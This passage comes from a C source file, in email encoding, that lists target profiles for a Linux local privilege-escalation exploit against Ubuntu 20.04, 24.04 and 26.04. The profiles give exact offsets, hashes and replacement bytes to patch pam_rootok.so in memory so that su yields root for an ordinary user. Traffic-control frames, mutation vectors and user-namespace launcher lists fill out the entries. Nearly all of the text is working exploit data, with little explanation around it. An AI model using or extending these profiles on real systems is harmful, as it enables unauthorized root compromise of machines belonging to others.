    }, .desired_slice =3D {
      0x31, 0xc0, 0x90, 0x90, 0x90, 0x85, 0xc0, 0x74
    }, .guard_after =3D {
      0x51, 0x85, 0xdb, 0xbb, 0x07, 0x00, 0x00, 0x00, 0x74, 0x1d, 0x48, 0=
x8d, 0x0d, 0x6b, 0x0b, 0x00
    },
    .success_message =3D "run command su",
    .tc_frame =3D {
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0=
x00, 0x08, 0x00, 0x45, 0x00, 
      0x02, 0x5c, 0x23, 0x45, 0x00, 0x00, 0x40, 0x32, 0x57, 0x29, 0x7f, 0=
x00, 0x00, 0x01, 0x7f, 0x00, 
      0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01, 0x86, 0=
x5d, 0xd9, 0x97, 0x5a, 0xf6, 
      0x19, 0xfe, 0x62, 0x5c, 0x62, 0x55, 0xbc, 0xcb, 0xa2, 0x67, 0xc5, 0=
x66, 0x1b, 0xd2, 0x0c, 0xb7, 
      0x55, 0xa1, 0xe9, 0x2b, 0x65, 0x4a, 0x8f, 0x54, 0x2c, 0x14, 0xb3, 0=
x6e, 0x28, 0x6c, 0x08, 0x15, 
      0xbf, 0x0c, 0xe5, 0x96, 0xad, 0x22, 0xd1, 0x6a, 0xb8, 0xb1, 0x90, 0=
x91, 0x92, 0x93, 0x94, 0x95
    }, .mutation_vector =3D {
      0x9e, 0x9f, 0xe6, 0x58, 0x9b, 0xb1, 0x18, 0xdb, 0x4f, 0x28, 0xb1, 0=
xc6, 0x24, 0x17, 0xb6, 0x37, 
      0x59, 0x37, 0xb6, 0xce, 0x5d, 0xea, 0x0d, 0xcd, 0x19, 0x59, 0x4f, 0=
x73, 0xac, 0x98, 0x0a, 0x02, 
      0xb3, 0xbf, 0x12, 0x12, 0x73, 0x2e, 0x54, 0x24, 0x1d, 0x2d, 0x0e, 0=
xb2, 0x8b, 0x98, 0xdf, 0x61, 
      0xae, 0x9c, 0xe2, 0xcf, 0x6f, 0x6a, 0x8f, 0x1b, 0x34, 0x62, 0x0a, 0=
x1b, 0xa1, 0xc9, 0xc3, 0x4e, 
      0xa7, 0xbd, 0xa3, 0x2a, 0x32, 0xec, 0x82, 0x52, 0xf3, 0xf2, 0x79, 0=
xfe, 0x22, 0x7f, 0x17, 0x55, 
      0x6b, 0xa3, 0x10, 0x29, 0x8b, 0xfc, 0xbf, 0x3c, 0x22, 0x8e, 0xbc, 0=
x2a, 0xbe, 0x0a, 0x90, 0xaf, 
      0x6b, 0x59, 0xa4, 0xe9, 0x24, 0x05, 0x4d, 0x2f, 0xa5, 0x8f, 0xd9, 0=
x52, 0x10, 0xaf, 0x0c, 0x54, 
      0x4c, 0x39, 0x97, 0xf8, 0x4d, 0xfe, 0x9a, 0x21, 0xeb, 0x19, 0x48, 0=
xb0, 0x53, 0xa2, 0x01, 0x83, 
      0xd9, 0xba, 0xea, 0x05, 0x97, 0x21, 0x0a, 0x60, 0xc1, 0xda, 0xe5, 0=
x35, 0xaa, 0x35, 0x61, 0x53, 
      0xe9, 0x19, 0xa4, 0x4b, 0x5d, 0x27, 0x22, 0xbb, 0xc8, 0x41, 0x73, 0=
x7a, 0x7c, 0xd8, 0xe4, 0x26, 
      0x5f, 0x19, 0x36, 0x8d, 0x5c, 0xf1, 0x12, 0x1a, 0x49, 0xff, 0xba, 0=
xd1, 0xd9, 0xd1, 0xb2, 0xf2, 
      0xbb, 0xe2, 0xc4, 0xb6, 0xd2, 0x3d, 0x20, 0xa4, 0x46, 0x77, 0x60, 0=
xba, 0xef, 0xaf, 0x9a, 0xf6, 
      0x72, 0xa6, 0xac, 0xcc, 0x69, 0xed, 0x81, 0xf5, 0xf5, 0x74, 0xeb, 0=
x14, 0x55, 0xd4, 0x5d, 0x21, 
      0xb8, 0xde, 0xd7, 0x80, 0x34, 0x59, 0x17, 0x09, 0x72, 0x96, 0x37, 0=
xf3, 0xe2, 0x0c, 0x8f, 0x4a, 
      0x80, 0xf5, 0xb5, 0x18, 0x65, 0x96, 0xde, 0x30, 0x00, 0xeb, 0x47, 0=
x9d, 0xa3, 0x1a, 0xb5, 0x71, 
      0xf8, 0xec, 0xb2, 0xef, 0x9a, 0xd0, 0x82, 0xe2, 0x15, 0x82, 0x69, 0=
xa0, 0x55, 0x6f, 0xe5, 0x93, 
      0xe5, 0x95, 0xfd, 0xe8, 0xf1, 0xb5, 0xf5, 0x4c, 0xbb, 0xce, 0x54, 0=
x9a, 0xa7, 0x9a, 0xf4, 0xf3, 
      0xe4, 0x60, 0xce, 0x30, 0xb1, 0x1d, 0x63, 0xb9, 0x3a, 0x50, 0xd8, 0=
xbf, 0xb5, 0x40, 0x80, 0x85, 
      0x0c, 0x25, 0x4a, 0x8b, 0x1a, 0x7b, 0x94, 0x05, 0xd0, 0xad, 0x89, 0=
x81, 0x26, 0x14, 0xfd, 0x08, 
      0x94, 0x24, 0x31, 0xf0, 0x55, 0xdd, 0x27, 0x2f, 0xfe, 0x1f, 0x76, 0=
x39, 0x61, 0x77, 0x28, 0xec, 
      0xde, 0x2b, 0xae, 0x3f, 0x31, 0x62, 0x70, 0xd9, 0xe4, 0x95, 0x23, 0=
x48, 0xb8, 0x37, 0x80, 0x82, 
      0xa0, 0x18, 0xb0, 0x6d, 0xa9, 0xf7, 0xda, 0x46, 0xae, 0x18, 0x28, 0=
x3e, 0x1e, 0xd1, 0x84, 0x6e, 
      0x4c, 0x45, 0xd5, 0xc7, 0xfc, 0xb9, 0x81, 0xc3, 0xb2, 0xa4, 0x7b, 0=
x84, 0x4a, 0xe4, 0x98, 0x9f, 
      0x32, 0x81, 0x03, 0x34, 0xf8, 0x7c, 0x28, 0x1f, 0x61, 0x33, 0x41, 0=
xfe, 0x94, 0x9c, 0xda, 0x66, 
      0xe7, 0xf1, 0x2c, 0x0a, 0xa4, 0xc4, 0x57, 0x91, 0x71, 0x74, 0x9c, 0=
x23, 0xae, 0x38, 0x9f, 0x3b, 
      0x91, 0x8a, 0xe0, 0xaa, 0xc8, 0xac, 0xd8, 0x05, 0x16, 0x90, 0xdc, 0=
xe8, 0x9b, 0xc6, 0xda, 0xfc, 
      0x86, 0x00, 0xcd, 0x0e, 0x61, 0xf1, 0x75, 0x7f, 0x6b, 0x88, 0x82, 0=
x0d, 0x89, 0xd0, 0xf9, 0xd2, 
      0x1e, 0x7c, 0xde, 0x98, 0xd9, 0x2f, 0x65, 0xc7, 0x25, 0xae, 0xf6, 0=
x18, 0xe0, 0xbf, 0x7a, 0x8d, 
      0xe5, 0x55, 0x74, 0x44, 0x12, 0x07, 0x82, 0x57, 0x13, 0xa1, 0x93, 0=
x4e, 0x65, 0x1a, 0xb2, 0xf7, 
      0xbc, 0xd2, 0xad, 0xa7, 0x23, 0x8b, 0x05, 0x0e, 0x91, 0xce, 0xdb, 0=
x15, 0x5f, 0x87, 0x9e, 0x12, 
      0x44, 0x82, 0x6d, 0x20, 0x39, 0xd6, 0x5a, 0xa5, 0x9f, 0x4f, 0xb9, 0=
x32, 0x9f, 0xae, 0xfa, 0x9b, 
      0x08, 0xdf, 0x4e, 0xcf, 0xe9, 0x15, 0xb4, 0x15, 0x91, 0x7f, 0x6e, 0=
xbc, 0xb4, 0x82, 0x2f, 0xf1, 
      0xc6, 0x00
    },
  },
  [12] =3D {
    .profile_id =3D "ubuntu2404-launcher",
    .evidence_aliases =3D "ubuntu24044-podman-host-poc,ubuntu2404-server-=
ga68,ubuntu2404-desktop-ga68",
    .kernel_releases =3D "6.8.0-134-generic",
    .distribution_id =3D "ubuntu",
    .distribution_version =3D "24.04",
    .package_name =3D "libpam-modules:amd64",
    .package_versions =3D "1.5.3-5ubuntu5.5",
    .filesystem =3D "ext4",
    .lsm_constraint =3D "apparmor:unconfined",
    .target_path =3D "/usr/lib/x86_64-linux-gnu/security/pam_rootok.so",
    .target_build_id =3D "87f6370e110e3020d23c1f7ee064600dd8672680",
    .baseline_sha256 =3D "48ebc2d5eeb3b3d90a6a8bd02e95dbba6272e8ce2cd3408=
8d5aa8a71d613db34",
    .mutated_sha256 =3D "7b0654d74aa7f5fc072f415292b9e27ca344c6a55ed88c05=
5c85c0b5faea6da7",
    .backing_page_sha256 =3D "f8105e4c077570c1e482783056b360d8ce31d3ff979=
e5ffc4faa5f54ea2d2989",
    .package_query =3D "dpkg",
    .execution_mode =3D "ubuntu_optional_launcher",
    .tc_mode =3D "matchall_pedit",
    .consumer_mode =3D "pipe_su",
    .direct_io_mode =3D "ext4_direct",
    .recovery_mode =3D "eviction_then_inverse",
    .allowed_launchers =3D "podman,buildah,rootlesskit,opam,tup,ch-run,mm=
debstrap",
    .automatic_launchers =3D "podman,buildah,rootlesskit,opam,tup,ch-run,=
mmdebstrap",
    .recovery_artifact =3D "ubuntu2404-launcher-recovery",
    .recovery_sha256 =3D "bf0d05bc74af80a37b32da032573666cf8cf3ce825484e7=
492797d17313df2a6",
    .distribution_suite =3D "noble",
    .allowed_supplementary_groups =3D "",
    .expected_uid =3D 1000, .expected_gid =3D 1000,
    .target_uid =3D 0, .target_gid =3D 0,
    .target_mode =3D 0644, .tc_frame_length =3D 96,
    .target_size =3D UINT64_C(0x3898), .target_offset =3D UINT64_C(0x1486=
),
    .flexible_identity =3D 1, .check_supplementary_groups =3D 1, .enabled=
 =3D 1,
    .guard_before =3D {
      0x10, 0x64, 0x48, 0x8b, 0x04, 0x25, 0x28, 0x00, 0x00, 0x00, 0x48, 0=
x89, 0x45, 0xd8, 0x31, 0xc0
    }, .original_slice =3D {
      0xe8, 0xf5, 0xfc, 0xff, 0xff, 0x85, 0xc0, 0x74
    }, .desired_slice =3D {
      0x31, 0xc0, 0x90, 0x90, 0x90, 0x85, 0xc0, 0x74
    }, .guard_after =3D {
      0x51, 0x85, 0xdb, 0xbb, 0x07, 0x00, 0x00, 0x00, 0x74, 0x1d, 0x48, 0=
x8d, 0x0d, 0x6b, 0x0b, 0x00
    },
    .success_message =3D "run command su",
    .tc_frame =3D {
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0=
x00, 0x08, 0x00, 0x45, 0x00, 
      0x02, 0x5c, 0x23, 0x45, 0x00, 0x00, 0x40, 0x32, 0x57, 0x29, 0x7f, 0=
x00, 0x00, 0x01, 0x7f, 0x00, 
      0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01, 0x86, 0=
x5d, 0xd9, 0x97, 0x5a, 0xf6, 
      0x19, 0xfe, 0x62, 0x5c, 0x62, 0x55, 0xbc, 0xcb, 0xa2, 0x67, 0xc5, 0=
x66, 0x1b, 0xd2, 0x0c, 0xb7, 
      0x55, 0xa1, 0xe9, 0x2b, 0x65, 0x4a, 0x8f, 0x54, 0x2c, 0x14, 0xb3, 0=
x6e, 0x28, 0x6c, 0x08, 0x15, 
      0xbf, 0x0c, 0xe5, 0x96, 0xad, 0x22, 0xd1, 0x6a, 0xb8, 0xb1, 0x90, 0=
x91, 0x92, 0x93, 0x94, 0x95
    }, .mutation_vector =3D {
      0x9e, 0x9f, 0xe6, 0x58, 0x9b, 0xb1, 0x18, 0xdb, 0x4f, 0x28, 0xb1, 0=
xc6, 0x24, 0x17, 0xb6, 0x37, 
      0x59, 0x37, 0xb6, 0xce, 0x5d, 0xea, 0x0d, 0xcd, 0x19, 0x59, 0x4f, 0=
x73, 0xac, 0x98, 0x0a, 0x02, 
      0xb3, 0xbf, 0x12, 0x12, 0x73, 0x2e, 0x54, 0x24, 0x1d, 0x2d, 0x0e, 0=
xb2, 0x8b, 0x98, 0xdf, 0x61, 
      0xae, 0x9c, 0xe2, 0xcf, 0x6f, 0x6a, 0x8f, 0x1b, 0x34, 0x62, 0x0a, 0=
x1b, 0xa1, 0xc9, 0xc3, 0x4e, 
      0xa7, 0xbd, 0xa3, 0x2a, 0x32, 0xec, 0x82, 0x52, 0xf3, 0xf2, 0x79, 0=
xfe, 0x22, 0x7f, 0x17, 0x55, 
      0x6b, 0xa3, 0x10, 0x29, 0x8b, 0xfc, 0xbf, 0x3c, 0x22, 0x8e, 0xbc, 0=
x2a, 0xbe, 0x0a, 0x90, 0xaf, 
      0x6b, 0x59, 0xa4, 0xe9, 0x24, 0x05, 0x4d, 0x2f, 0xa5, 0x8f, 0xd9, 0=
x52, 0x10, 0xaf, 0x0c, 0x54, 
      0x4c, 0x39, 0x97, 0xf8, 0x4d, 0xfe, 0x9a, 0x21, 0xeb, 0x19, 0x48, 0=
xb0, 0x53, 0xa2, 0x01, 0x83, 
      0xd9, 0xba, 0xea, 0x05, 0x97, 0x21, 0x0a, 0x60, 0xc1, 0xda, 0xe5, 0=
x35, 0xaa, 0x35, 0x61, 0x53, 
      0xe9, 0x19, 0xa4, 0x4b, 0x5d, 0x27, 0x22, 0xbb, 0xc8, 0x41, 0x73, 0=
x7a, 0x7c, 0xd8, 0xe4, 0x26, 
      0x5f, 0x19, 0x36, 0x8d, 0x5c, 0xf1, 0x12, 0x1a, 0x49, 0xff, 0xba, 0=
xd1, 0xd9, 0xd1, 0xb2, 0xf2, 
      0xbb, 0xe2, 0xc4, 0xb6, 0xd2, 0x3d, 0x20, 0xa4, 0x46, 0x77, 0x60, 0=
xba, 0xef, 0xaf, 0x9a, 0xf6, 
      0x72, 0xa6, 0xac, 0xcc, 0x69, 0xed, 0x81, 0xf5, 0xf5, 0x74, 0xeb, 0=
x14, 0x55, 0xd4, 0x5d, 0x21, 
      0xb8, 0xde, 0xd7, 0x80, 0x34, 0x59, 0x17, 0x09, 0x72, 0x96, 0x37, 0=
xf3, 0xe2, 0x0c, 0x8f, 0x4a, 
      0x80, 0xf5, 0xb5, 0x18, 0x65, 0x96, 0xde, 0x30, 0x00, 0xeb, 0x47, 0=
x9d, 0xa3, 0x1a, 0xb5, 0x71, 
      0xf8, 0xec, 0xb2, 0xef, 0x9a, 0xd0, 0x82, 0xe2, 0x15, 0x82, 0x69, 0=
xa0, 0x55, 0x6f, 0xe5, 0x93, 
      0xe5, 0x95, 0xfd, 0xe8, 0xf1, 0xb5, 0xf5, 0x4c, 0xbb, 0xce, 0x54, 0=
x9a, 0xa7, 0x9a, 0xf4, 0xf3, 
      0xe4, 0x60, 0xce, 0x30, 0xb1, 0x1d, 0x63, 0xb9, 0x3a, 0x50, 0xd8, 0=
xbf, 0xb5, 0x40, 0x80, 0x85, 
      0x0c, 0x25, 0x4a, 0x8b, 0x1a, 0x7b, 0x94, 0x05, 0xd0, 0xad, 0x89, 0=
x81, 0x26, 0x14, 0xfd, 0x08, 
      0x94, 0x24, 0x31, 0xf0, 0x55, 0xdd, 0x27, 0x2f, 0xfe, 0x1f, 0x76, 0=
x39, 0x61, 0x77, 0x28, 0xec, 
      0xde, 0x2b, 0xae, 0x3f, 0x31, 0x62, 0x70, 0xd9, 0xe4, 0x95, 0x23, 0=
x48, 0xb8, 0x37, 0x80, 0x82, 
      0xa0, 0x18, 0xb0, 0x6d, 0xa9, 0xf7, 0xda, 0x46, 0xae, 0x18, 0x28, 0=
x3e, 0x1e, 0xd1, 0x84, 0x6e, 
      0x4c, 0x45, 0xd5, 0xc7, 0xfc, 0xb9, 0x81, 0xc3, 0xb2, 0xa4, 0x7b, 0=
x84, 0x4a, 0xe4, 0x98, 0x9f, 
      0x32, 0x81, 0x03, 0x34, 0xf8, 0x7c, 0x28, 0x1f, 0x61, 0x33, 0x41, 0=
xfe, 0x94, 0x9c, 0xda, 0x66, 
      0xe7, 0xf1, 0x2c, 0x0a, 0xa4, 0xc4, 0x57, 0x91, 0x71, 0x74, 0x9c, 0=
x23, 0xae, 0x38, 0x9f, 0x3b, 
      0x91, 0x8a, 0xe0, 0xaa, 0xc8, 0xac, 0xd8, 0x05, 0x16, 0x90, 0xdc, 0=
xe8, 0x9b, 0xc6, 0xda, 0xfc, 
      0x86, 0x00, 0xcd, 0x0e, 0x61, 0xf1, 0x75, 0x7f, 0x6b, 0x88, 0x82, 0=
x0d, 0x89, 0xd0, 0xf9, 0xd2, 
      0x1e, 0x7c, 0xde, 0x98, 0xd9, 0x2f, 0x65, 0xc7, 0x25, 0xae, 0xf6, 0=
x18, 0xe0, 0xbf, 0x7a, 0x8d, 
      0xe5, 0x55, 0x74, 0x44, 0x12, 0x07, 0x82, 0x57, 0x13, 0xa1, 0x93, 0=
x4e, 0x65, 0x1a, 0xb2, 0xf7, 
      0xbc, 0xd2, 0xad, 0xa7, 0x23, 0x8b, 0x05, 0x0e, 0x91, 0xce, 0xdb, 0=
x15, 0x5f, 0x87, 0x9e, 0x12, 
      0x44, 0x82, 0x6d, 0x20, 0x39, 0xd6, 0x5a, 0xa5, 0x9f, 0x4f, 0xb9, 0=
x32, 0x9f, 0xae, 0xfa, 0x9b, 
      0x08, 0xdf, 0x4e, 0xcf, 0xe9, 0x15, 0xb4, 0x15, 0x91, 0x7f, 0x6e, 0=
xbc, 0xb4, 0x82, 0x2f, 0xf1, 
      0xc6, 0x00
    },
  },
  [13] =3D {
    .profile_id =3D "ubuntu2604-launcher",
    .evidence_aliases =3D "ubuntu2604-podman-host-poc,ubuntu2604-server,u=
buntu2604-desktop",
    .kernel_releases =3D "7.0.0-28-generic",
    .distribution_id =3D "ubuntu",
    .distribution_version =3D "26.04",
    .package_name =3D "libpam-modules:amd64",
    .package_versions =3D "1.7.0-5ubuntu3",
    .filesystem =3D "ext4",
    .lsm_constraint =3D "apparmor:unconfined",
    .target_path =3D "/usr/lib/x86_64-linux-gnu/security/pam_rootok.so",
    .target_build_id =3D "5b7d4bfa66abb285633f9d39458117bac1b96f60",
    .baseline_sha256 =3D "532a7ab99c6feae9fb78229bb4cdf7d95f250b23d0f4ffc=
1bed43bb532af8d23",
    .mutated_sha256 =3D "02525e43194708dc5728a1b25b9749aca850eba4f3e5b8bf=
d70de1f45e7b7d25",
    .backing_page_sha256 =3D "0d4a666671377c4b2ac24956c7f7eea612e7e56cbe2=
e385fd5e735b5ca346c13",
    .package_query =3D "dpkg",
    .execution_mode =3D "ubuntu_optional_launcher",
    .tc_mode =3D "matchall_pedit",
    .consumer_mode =3D "pipe_su",
    .direct_io_mode =3D "ext4_direct",
    .recovery_mode =3D "eviction_then_inverse",
    .allowed_launchers =3D "podman,buildah,rootlesskit,opam,tup,ch-run,mm=
debstrap,lxc-usernsexec,vdens,vpnns,userbindmount,rpm,bazel,uwsgi-core,li=
bcamerify,runc,crun,sbuild",
    .automatic_launchers =3D "podman,buildah,rootlesskit,opam,tup,ch-run,=
mmdebstrap,lxc-usernsexec,vdens,vpnns,userbindmount,rpm,bazel,uwsgi-core,=
libcamerify",
    .recovery_artifact =3D "ubuntu2604-launcher-recovery",
    .recovery_sha256 =3D "2857a19441ad9a3a1cb5e745fbddeb4f789675861c47522=
fdc642ac7d4a08b91",
    .distribution_suite =3D "resolute",
    .allowed_supplementary_groups =3D "",
    .expected_uid =3D 1000, .expected_gid =3D 1000,
    .target_uid =3D 0, .target_gid =3D 0,
    .target_mode =3D 0644, .tc_frame_length =3D 96,
    .target_size =3D UINT64_C(0x38e8), .target_offset =3D UINT64_C(0x148f=
),
    .flexible_identity =3D 1, .check_supplementary_groups =3D 1, .enabled=
 =3D 1,
    .guard_before =3D {
      0x28, 0x64, 0x48, 0x8b, 0x1c, 0x25, 0x28, 0x00, 0x00, 0x00, 0x48, 0=
x89, 0x5d, 0xd8, 0x89, 0xf3
    }, .original_slice =3D {
      0xe8, 0xec, 0xfc, 0xff, 0xff, 0x85, 0xc0, 0x74
    }, .desired_slice =3D {
      0x31, 0xc0, 0x90, 0x90, 0x90, 0x85, 0xc0, 0x74
    }, .guard_after =3D {
      0x48, 0x85, 0xdb, 0xbb, 0x07, 0x00, 0x00, 0x00, 0x74, 0x1d, 0x48, 0=
x8d, 0x0d, 0x62, 0x0b, 0x00
    },
    .success_message =3D "run command su",
    .tc_frame =3D {
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0=
x00, 0x08, 0x00, 0x45, 0x00, 
      0x02, 0x5c, 0x23, 0x45, 0x00, 0x00, 0x40, 0x32, 0x57, 0x29, 0x7f, 0=
x00, 0x00, 0x01, 0x7f, 0x00, 
      0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01, 0xa7, 0=
x58, 0xde, 0xe1, 0xad, 0x0a, 
      0xd8, 0x74, 0x35, 0x30, 0xac, 0x2d, 0x87, 0x67, 0xcc, 0xa8, 0x93, 0=
x48, 0x4e, 0xd7, 0x94, 0x02, 
      0x55, 0x12, 0x4c, 0xa6, 0x77, 0x86, 0xa7, 0xa2, 0x40, 0x0e, 0x5a, 0=
x1e, 0x4c, 0x79, 0xd4, 0xe7, 
      0x47, 0x9b, 0x93, 0x80, 0xf5, 0x79, 0x6c, 0x5e, 0x1c, 0xd1, 0x90, 0=
x91, 0x92, 0x93, 0x94, 0x95
    }, .mutation_vector =3D {
      0x9e, 0x9f, 0xed, 0xd5, 0xcc, 0x75, 0x48, 0x3a, 0x96, 0xd3, 0xbb, 0=
xa4, 0x4c, 0x6c, 0x86, 0x2b, 
      0xf0, 0x98, 0x4f, 0x0b, 0x00, 0xfe, 0xaa, 0xd5, 0x74, 0x44, 0x21, 0=
x25, 0x38, 0x68, 0xac, 0x0e, 
      0xd0, 0x6f, 0xbb, 0xf3, 0x27, 0xb1, 0x5a, 0xb8, 0x66, 0xaf, 0x49, 0=
xc6, 0xd8, 0xd8, 0x96, 0xec, 
      0x14, 0x6a, 0xa4, 0xd3, 0x8b, 0x6e, 0x6d, 0xd9, 0x04, 0xf0, 0xe7, 0=
x8b, 0xc2, 0x96, 0xda, 0x7c, 
      0xa9, 0x42, 0xfd, 0xc7, 0x12, 0x21, 0x13, 0xb5, 0xa6, 0xe9, 0xe5, 0=
x00, 0xde, 0x45, 0xcc, 0xf8, 
      0xc4, 0x31, 0x42, 0xc4, 0x29, 0x7c, 0xef, 0x03, 0xf4, 0x0b, 0xcd, 0=
x44, 0x86, 0x92, 0xb6, 0xc5, 
      0x59, 0x5b, 0xb6, 0x57, 0x2b, 0x39, 0x34, 0xfa, 0x07, 0xd5, 0x6d, 0=
xc6, 0xb5, 0xda, 0xcc, 0x09, 
      0x82, 0x79, 0x93, 0x75, 0x52, 0xe8, 0x7b, 0x99, 0xbb, 0x15, 0xe8, 0=
x62, 0xf0, 0x91, 0x37, 0xb5, 
      0x6a, 0x63, 0x0d, 0x8d, 0xb1, 0x94, 0xa6, 0xc3, 0xf2, 0xcc, 0x7f, 0=
x4b, 0x73, 0x0f, 0xf5, 0x63, 
      0xe4, 0x69, 0xf8, 0x53, 0x53, 0x8e, 0x35, 0xb2, 0xb1, 0x8e, 0xec, 0=
x70, 0x72, 0x77, 0xef, 0x12, 
      0x53, 0xad, 0x0f, 0x04, 0xe8, 0xb8, 0x82, 0xbd, 0x5f, 0x6e, 0xb7, 0=
xac, 0x6e, 0xc9, 0xc9, 0x0b, 
      0x5e, 0x2c, 0xdb, 0x5c, 0x37, 0x94, 0x6c, 0x80, 0x24, 0xa2, 0x88, 0=
xd4, 0xaa, 0xa2, 0x57, 0x57, 
      0x7b, 0x0d, 0x9f, 0x51, 0x79, 0xde, 0x29, 0x62, 0x63, 0xc6, 0x98, 0=
x74, 0x90, 0xc3, 0x99, 0x89, 
      0x4c, 0x48, 0x60, 0xee, 0xb8, 0xc0, 0xe1, 0x63, 0x1a, 0x11, 0xef, 0=
xe9, 0xeb, 0xae, 0xbf, 0xa0, 
      0x88, 0x56, 0x30, 0x0f, 0xce, 0xad, 0x86, 0x5a, 0xdd, 0xff, 0xa2, 0=
xed, 0x4a, 0xbf, 0x40, 0xc6, 
      0xcc, 0xca, 0xfd, 0xce, 0x40, 0x8d, 0x44, 0xc4, 0x3e, 0xd2, 0xfd, 0=
x86, 0x5f, 0x75, 0x4e, 0xc9, 
      0xc3, 0xd8, 0x43, 0x33, 0x8e, 0x6b, 0x17, 0xa4, 0x9e, 0xc3, 0x72, 0=
x30, 0xba, 0x56, 0x8d, 0x1a, 
      0xf1, 0x83, 0xfd, 0x8e, 0x03, 0x6e, 0x4e, 0x54, 0xa2, 0xb8, 0x7b, 0=
x83, 0xde, 0x12, 0xa7, 0xcf, 
      0x52, 0xb3, 0x1e, 0x3c, 0xaa, 0xf1, 0x95, 0x70, 0x9a, 0x93, 0x33, 0=
xb7, 0x8b, 0x82, 0x65, 0x22, 
      0x4f, 0xc2, 0x86, 0x0f, 0x70, 0x8b, 0xf3, 0xbe, 0xf2, 0xb5, 0xe3, 0=
x49, 0xb5, 0x28, 0x48, 0x3d, 
      0xae, 0x23, 0xd2, 0x41, 0x69, 0x57, 0xce, 0x06, 0x13, 0xf4, 0x35, 0=
xfb, 0x0b, 0x16, 0x31, 0xde, 
      0x3b, 0xe5, 0x29, 0x0d, 0x7f, 0x30, 0x39, 0x43, 0xb8, 0x7f, 0x0e, 0=
x8e, 0x33, 0x3e, 0xf8, 0xfd, 
      0x97, 0xa5, 0x21, 0xb3, 0xbc, 0x88, 0x64, 0xab, 0x59, 0x79, 0x7e, 0=
x50, 0x39, 0x95, 0x70, 0x6c, 
      0x7c, 0xf9, 0x08, 0x1e, 0xa0, 0x59, 0x22, 0xca, 0x37, 0x99, 0xa8, 0=
x34, 0x2a, 0x95, 0x59, 0xc4, 
      0xf4, 0xd9, 0x7c, 0xc2, 0x3e, 0x8e, 0xa8, 0x18, 0x37, 0x96, 0x69, 0=
xfc, 0x63, 0x67, 0x52, 0xa0, 
      0x13, 0x2d, 0x1b, 0xa5, 0x26, 0x11, 0x0d, 0xe8, 0xa0, 0x60, 0x8d, 0=
x02, 0x3d, 0x88, 0xe4, 0x04, 
      0xb2, 0x47, 0x19, 0xd9, 0xfb, 0xd4, 0x18, 0xa0, 0xf9, 0x08, 0x3e, 0=
x9b, 0x79, 0xcc, 0x4f, 0x63, 
      0x2f, 0x40, 0x2b, 0x82, 0x45, 0xa6, 0x90, 0x14, 0xb1, 0xa9, 0x40, 0=
x16, 0xe6, 0x52, 0xfb, 0xae, 
      0x7d, 0xc1, 0x07, 0x55, 0x13, 0x75, 0xe8, 0x87, 0xa4, 0x40, 0xe2, 0=
x27, 0xd9, 0x64, 0x6d, 0x63, 
      0x06, 0x21, 0x83, 0x56, 0x0b, 0x4b, 0x50, 0xcd, 0x73, 0x44, 0x9d, 0=
x78, 0x22, 0x8f, 0x23, 0xed, 
      0x83, 0x54, 0x8d, 0xae, 0xd9, 0x38, 0x98, 0x6c, 0xa8, 0x34, 0xee, 0=
xcc, 0x01, 0xbf, 0x68, 0xa1, 
      0x13, 0xc7, 0xf7, 0xcb, 0x4f, 0x16, 0xaf, 0x23, 0xff, 0xea, 0xd2, 0=
xb8, 0x3e, 0x64, 0xa2, 0xb8, 
      0x8d, 0x8f
    },
  },
  /*
   * Locally derived from Canonical's amd64 libpam-modules
   * 1.3.1-5ubuntu4.7 package. One profile covers Server and Desktop beca=
use
   * those roles share the matched kernel, package, target and filesystem=
.
   * Runtime confirmation remains pending.
   */
  [14] =3D {
    .profile_id =3D "ubuntu2004-hwe515",
    .evidence_aliases =3D "ubuntu2004-server-hwe515,ubuntu2004-desktop-hw=
e515",
    .kernel_releases =3D "5.15.0-186-generic",
    .distribution_id =3D "ubuntu",
    .distribution_version =3D "20.04",
    .package_name =3D "libpam-modules",
    .package_versions =3D "1.3.1-5ubuntu4.7",
    .filesystem =3D "ext4",
    .lsm_constraint =3D "none",
    .target_path =3D "/usr/lib/x86_64-linux-gnu/security/pam_rootok.so",
    .target_build_id =3D "979ebf1b1507fd32a5ba1660ed63fd7ebbeeef36",
    .baseline_sha256 =3D "dce0e69d1faed6829473466b1336bcbf5b6c66d83b03543=
8bfdabe11f38af299",
    .mutated_sha256 =3D "ad90c4bfe019b789f7f022a37375f2a1ae3d4b154e7ec1d1=
07b301e3ba7c91e8",
    .backing_page_sha256 =3D "11603ffe12b0f1f7c0ddb9e981ea2f513b1fef1a28c=
4ab79899736efbf951217",
    .package_query =3D "dpkg",
    .execution_mode =3D "direct_unshare",
    .tc_mode =3D "embedded_u32",
    .consumer_mode =3D "pipe_su",
    .direct_io_mode =3D "ext4_direct",
    .recovery_mode =3D "snapshot_rollback",
    .allowed_launchers =3D "",
    .automatic_launchers =3D "",
    .recovery_artifact =3D "",
    .recovery_sha256 =3D "",
    .distribution_suite =3D "focal",
    .allowed_supplementary_groups =3D "",
    .expected_uid =3D 1000, .expected_gid =3D 1000,
    .target_uid =3D 0, .target_gid =3D 0,
    .target_mode =3D 0644, .tc_frame_length =3D 88,
    .target_size =3D UINT64_C(0x38d8), .target_offset =3D UINT64_C(0x1440=
),
    .flexible_identity =3D 1, .check_supplementary_groups =3D 1, .enabled=
 =3D 0,
    .guard_before =3D {
      0xff, 0x66, 0x66, 0x2e, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0=
x00, 0x0f, 0x1f, 0x40, 0x00
    }, .original_slice =3D {
      0xf3, 0x0f, 0x1e, 0xfa, 0x41, 0x56, 0x41, 0x55
    }, .desired_slice =3D {
      0x31, 0xc0, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90
    }, .guard_after =3D {
      0x41, 0x54, 0x55, 0x48, 0x89, 0xfd, 0x53, 0x48, 0x83, 0xec, 0x10, 0=
x64, 0x48, 0x8b, 0x04, 0x25
    },
    .success_message =3D "run command su",
#include "generated/ubuntu2004-hwe515-arrays.inc"
  },
  /*
   * Static package/image candidates below were derived from vendor packa=
ges
   * and image manifests. They remain disabled until an installed target =
is
   * audited; individually enabled entries are awaiting full VM confirmat=
